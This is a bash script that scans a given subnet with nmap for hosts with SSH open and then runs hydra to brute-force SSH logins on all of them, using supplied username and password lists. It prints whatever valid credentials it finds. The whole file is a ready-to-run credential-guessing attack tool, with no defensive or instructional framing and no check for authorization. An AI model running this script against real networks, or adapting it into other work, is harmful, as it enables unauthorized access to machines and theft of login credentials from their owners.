#!/usr/bin/env bash

if [ ! $# -eq 3 ]
then
	echo "Usage: $0 <SUBNET | Username_File | Password_File>"
	exit 1
fi

subnet=$1
username_file=$2
password_file=$3

for exists_file in "$username_file" "$password_file"
do
	if [ ! -f "$exists_file" ]
	then
		echo "File: $exists_file Doesn't Exists !!!"
		exit 1
	fi
done

echo "$subnet" | grep -Eq "^([0-9]{1,3}\.){3}[0-9]+/[0-9]+"
if [ ! $? -eq 0 ]
then
	echo "Subnet: $subnet must cidr format"
	exit 2
fi

echo "$subnet - $username_file - $password_file"

hydra_result_file="`mktemp /tmp/$USER.XXXXXX`"
nmap_result_file="`mktemp /tmp/$USER.XXXXXX`"

nmap -n -Pn -sS -p 22 "$subnet" --open --min-hostgroup 64 -oG -  | grep "22/open/tcp/" | cut -d " " -f2  > $nmap_result_file

hydra -L $username_file  -P $password_file -t 4 -e ns -M $nmap_result_file ssh -o $hydra_result_file  2>/dev/null  >/dev/null

cat $hydra_result_file | grep -Ev "^#"

rm -f $nmap_result_file $hydra_result_file 2>/dev/null













